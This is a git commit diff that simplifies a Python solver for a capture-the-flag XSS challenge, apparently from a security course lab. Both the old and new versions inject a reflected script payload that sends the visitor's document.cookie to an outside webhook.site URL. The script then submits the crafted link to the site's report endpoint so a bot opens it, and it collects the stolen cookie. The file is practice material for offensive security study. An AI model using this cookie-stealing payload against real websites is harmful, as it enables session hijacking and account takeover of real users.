02e6586fd5a7cb98872e46e2dad649a8efd7c0b1
SAW <99191294+nicsaw@users.noreply.github.com>
2025-05-14 02:07:36 +1000

    XSS Playground 1: simplify

--- ctf/4-XSS/xss_playground_1.py
+++ ctf/4-XSS/xss_playground_1.py
@@ -1,39 +1,21 @@
 import sys
 from pathlib import Path
 sys.path.append(str(Path(__file__).resolve().parent.parent))
-from utils import get_session, find_flag
-
-import json
-import time
-
-BASE_URL = "https://xss-playground-1.quoccacorp.com"
+from utils import get_session, WebhookSite
 
 class Solver:
     def __init__(self):
         self.session = get_session()
-        self.webhooksite_uuid = self.get_webhooksite_uuid()
-        self.webhooksite_url = f"https://webhook.site/{self.webhooksite_uuid}"
-        self.webhooksite_requests_url = f"https://webhook.site/token/{self.webhooksite_uuid}/requests"
-
-    def get_webhooksite_uuid(self):
-        response = self.session.post("https://webhook.site/token")
-        return response.json()["uuid"]
-
-    def find_flag_webhooksite(self, delay_seconds=2):
-        time.sleep(delay_seconds)
-        response = self.session.get(self.webhooksite_requests_url)
-        response_json = response.json()
-        response_json_text = json.dumps(response_json, indent=2)
-        find_flag(response_json_text)
+        self.webhooksite = WebhookSite()
 
     def main(self):
-        PAYLOAD = f'<script>document.location = "{self.webhooksite_url}?q=" + document.cookie</script>'
+        BASE_URL = "https://xss-playground-1.quoccacorp.com"
+
+        PAYLOAD = f'<script>fetch(`{self.webhooksite.url}?q=${{document.cookie}}`)</script>'
         response = self.session.get(BASE_URL, params={"name": PAYLOAD})
 
-        redirect_url = response.url
-        self.session.post(f"{BASE_URL}/report", data={"url": redirect_url})
-
-        self.find_flag_webhooksite()
+        self.session.post(f"{BASE_URL}/report", data={"url": response.url})
+        self.webhooksite.find_flags()
 
 if __name__ == "__main__":
     Solver().main()
